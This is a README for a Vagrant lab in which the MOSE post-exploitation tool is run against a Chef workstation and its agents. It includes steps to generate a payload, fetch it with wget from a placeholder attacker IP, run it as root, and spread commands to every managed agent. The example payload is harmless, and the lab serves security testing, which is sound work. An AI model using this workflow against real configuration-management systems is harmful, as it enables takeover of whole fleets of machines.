# chef-test-lab
Create test lab which can be used to play around with MOSE and Chef.

**Warning, take heed: This lab should be run in a controlled environment, as it contains vulnerable assets.

## Dependencies
You must download and install the following for this environment to work:
* [Vagrant](https://www.vagrantup.com/downloads.html)

## Lab Build Instructions
To create an environment with a Chef Workstation and a Chef Server that controls multiple agents, run the following command:
```
make build && make run
```
To run MOSE against the chef workstation:
1. Build MOSE using `make build` in the MOSE repo
2. Generate a payload with MOSE: `./mose -c "touch /tmp/BLA && echo test >> /tmp/BLA" -t chef`
3. Login to the chef workstation: `vagrant ssh chef_workstation` (the password is vagrant)
4. Escalate to root with ```sudo su```
5. Download the binary from MOSE: `wget http://YOURIPADDRESSGOESHERE:8090/chef-linux`
6. Run the payload: `chmod +x chef-linux; ./chef-linux`
7. Wait for 30 minutes or exec into one of the agents and kick off the payload manually: `vagrant ssh chef_agent_1` (the password is vagrant)
	7a. Escalate to root with ```sudo su```
	7b. Run ```chef-client```
8. For this example, you should note that a file has been created in `/tmp` in all of the chef-agent virtual machines, as we specified in step 2.

To run MOSE against the chef server:

To tear down the test environment, run the following command:
```
make destroy
```
